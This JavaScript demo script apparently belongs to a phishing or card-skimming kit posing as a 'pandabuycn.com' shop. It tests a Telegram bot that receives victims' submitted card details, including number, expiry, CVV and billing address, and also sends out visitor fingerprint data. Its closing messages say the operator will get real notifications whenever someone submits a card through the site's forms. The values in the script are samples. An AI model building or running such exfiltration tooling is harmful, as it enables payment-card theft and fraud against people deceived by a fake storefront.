// Demo script to test Telegram bot functionality
// Run this after configuring your bot to see how notifications work

const TelegramBot = require('./telegram-bot.js');

// Load configuration
let config;
try {
  config = require('./config.local.js');
} catch (error) {
  config = require('./config.js');
}

// Initialize bot
if (config.telegram.botToken === 'YOUR_BOT_TOKEN_HERE') {
  console.log('❌ Please configure your bot token in config.local.js first!');
  console.log('Run: ./setup-telegram.sh for help');
  process.exit(1);
}

const bot = new TelegramBot(config.telegram.botToken, config.telegram.chatId);

async function runDemo() {
  console.log('🤖 Testing Telegram Bot...');
  
  try {
    // Test connection
    console.log('1. Testing connection...');
    await bot.testConnection();
    console.log('✅ Connection test successful!');
    
    // Wait a bit
    await new Promise(resolve => setTimeout(resolve, 2000));
    
    // Test card notification
    console.log('2. Testing card notification...');
    const sampleCardData = {
      cardNumber: '4532123456789012',
      cardName: 'John Doe',
      expMonth: '12',
      expYear: '25',
      cvv: '123',
      email: 'john.doe@example.com',
      phoneNumber: '+1234567890',
      billingAddress: '123 Main Street',
      city: 'New York',
      state: 'NY',
      zipCode: '10001',
      country: 'United States',
      serverTimestamp: new Date().toISOString(),
      submissionDate: new Date().toLocaleDateString(),
      submissionTime: new Date().toLocaleTimeString(),
      domain: 'pandabuycn.com',
      visitorData: {
        ip: '192.168.1.100',
        country: 'United States',
        city: 'New York',
        browser: {
          name: 'Chrome',
          version: '91.0.4472.124'
        },
        os: {
          name: 'Windows 10'
        },
        device: {
          type: 'Desktop'
        },
        screen: {
          resolution: '1920x1080'
        },
        locale: {
          timezone: 'America/New_York',
          language: 'en-US'
        }
      }
    };
    
    await bot.sendCardNotification(sampleCardData);
    console.log('✅ Card notification sent!');
    
    // Wait a bit
    await new Promise(resolve => setTimeout(resolve, 2000));
    
    // Test visit notification
    console.log('3. Testing visit notification...');
    const sampleVisitData = {
      timestamp: new Date().toISOString(),
      server: {
        serverIP: '192.168.1.100'
      },
      browser: {
        name: 'Chrome',
        version: '91.0.4472.124'
      },
      os: {
        name: 'Windows 10'
      },
      device: {
        type: 'Desktop'
      },
      geoLocation: {
        country: 'United States',
        city: 'New York'
      },
      locale: {
        timezone: 'America/New_York',
        language: 'en-US'
      },
      screen: {
        resolution: '1920x1080'
      },
      page: {
        pathname: '/'
      },
      traffic: {
        referrer: 'Direct'
      }
    };
    
    await bot.sendVisitNotification(sampleVisitData);
    console.log('✅ Visit notification sent!');
    
    console.log('');
    console.log('🎉 Demo completed successfully!');
    console.log('Check your Telegram chat for the test messages.');
    console.log('');
    console.log('Your bot is now ready to receive real notifications when:');
    console.log('• Someone submits a card through your forms');
    console.log('• Someone visits your site (if enabled)');
    
  } catch (error) {
    console.error('❌ Demo failed:', error.message);
    console.log('');
    console.log('Common issues:');
    console.log('• Check your bot token in config.local.js');
    console.log('• Make sure your chat ID is correct');
    console.log('• Ensure you started a chat with your bot');
    console.log('• Check your internet connection');
  }
}

// Run the demo
runDemo(); 